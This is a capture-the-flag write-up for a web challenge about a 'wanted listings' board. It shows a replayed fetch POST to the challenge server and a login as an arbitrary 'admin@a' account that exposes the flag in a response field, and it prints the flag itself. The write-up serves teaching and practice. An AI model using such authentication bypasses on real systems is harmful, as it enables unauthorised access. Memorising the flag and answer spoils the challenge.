# The Wanted Listing Trap

## Description

The wanted board lets buyers call for help. Can you turn one request into a response that reveals too much?

## Solution Walkthrough

This challenge is quite interesting; based on the title, it's clear that it has something to do with wanted listings.

So, naturally, the first step is to create one with arbitrary title and content. Afterward, click the "respond" button. It's normal for nothing to appear when you click through, but it has actually already sent a request for you, which includes `I can help with that! Contact me at the number below.`

```js
fetch("http://159.89.230.27/api/wanted-listings/cmqqf251l0000p601ciq59mta/respond", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-Hant;q=0.6,und;q=0.5",
    "content-type": "application/json"
  },
  "referrer": "http://159.89.230.27/listing/respond?listingId=cmqqf251l0000p601ciq59mta",
  "body": "{\"message\":\"I can help with that! Contact me at the number below.\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

You will receive a response. If `phoneNumber` is added to the body, then something will appear in the phone number field.

```json
{
    "success": true,
    "response": {
        "id": "cmqqffnoc0004p601oa0jm3wu",
        "wantedListingId": "cmqqf251l0000p601ciq59mta",
        "responderId": "1vp1ge",
        "message": "I can help with that! Contact me at the number below.",
        "phoneNumber": null,
        "createdAt": "2026-06-23T09:13:16.189Z"
    }
}
```

Alright, no matter how many times you try the above, you won't get the flag. There is also no admin bot to perform XSS on. The strange thing is that you can discover that entering any arbitrary account and password on the login page will actually log you in.

So, using `admin@a` with an arbitrary password allows you to log in. After repeating the steps above, you will see the flag in the `phoneNumber` field.

```json
{
    "success": true,
    "response": {
        "id": "cmqqffnoc0004p601oa0jm3wu",
        "wantedListingId": "cmqqf251l0000p601ciq59mta",
        "responderId": "1vp1ge",
        "message": "I can help with that! Contact me at the number below.",
        "phoneNumber": "bitflag{csrf_1s_4_sl33py_thr34t}",
        "createdAt": "2026-06-23T09:13:16.189Z"
    }
}
```

## Flag

```text
bitflag{csrf_1s_4_sl33py_thr34t}
```
